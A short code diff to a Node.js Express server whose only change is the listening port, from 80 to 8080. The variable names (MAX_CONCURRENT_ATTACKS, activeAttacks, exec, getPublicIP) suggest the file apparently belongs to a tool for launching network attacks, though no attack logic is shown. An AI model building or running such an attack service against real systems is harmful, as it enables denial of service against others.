@@ -1,6 +1,6 @@
 const express = require("express"), { exec } = require("child_process"), axios = require("axios");
 
-const app = express(), port = 80, MAX_CONCURRENT_ATTACKS = 1;
+const app = express(), port = 8080, MAX_CONCURRENT_ATTACKS = 1;
 let activeAttacks = 0, currentPID = null;
 
 const getPublicIP = async () => {
